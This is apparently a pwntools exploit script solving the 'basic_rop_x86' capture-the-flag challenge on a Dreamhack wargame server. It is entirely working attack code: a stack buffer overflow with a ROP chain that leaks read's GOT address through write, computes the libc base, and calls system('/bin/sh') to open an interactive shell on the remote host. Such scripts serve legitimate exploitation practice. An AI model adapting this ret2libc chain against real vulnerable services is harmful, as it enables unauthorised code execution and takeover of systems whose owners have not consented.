from pwn import *

def slog(name, addr):
    return success(': '.join([name, hex(addr)]))

# p = process('./basic_rop_x86')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
p = remote('host3.dreamhack.games', 15000)
libc = ELF('./libc.so.6')
p_elf = ELF('./basic_rop_x86')
r = ROP(p_elf)
ppp = r.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]
pop_ebx = r.find_gadget(['pop ebx', 'ret'])[0]
slog('ppp', ppp)

read_got = p_elf.got['read']
write_plt = p_elf.plt['write']
main = p_elf.symbols['main']
payload = b'A' * 0x44 + b'B' * 0x4
# call = push return addr to stack + jmp func
payload += p32(write_plt)
payload += p32(ppp)         # return addr
payload += p32(1) + p32(read_got) + p32(4)
payload += p32(main)

p.send(payload)

p.recvuntil(b'A' * 0x40)
read = u32(p.recvn(4))
slog('read', read)

libc_base = read - libc.symbols['read']
system = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
payload = b'A' * 0x44 + b'B' * 0x4
payload += p32(system)
payload += p32(pop_ebx)
payload += p32(binsh)

p.send(payload)

p.interactive()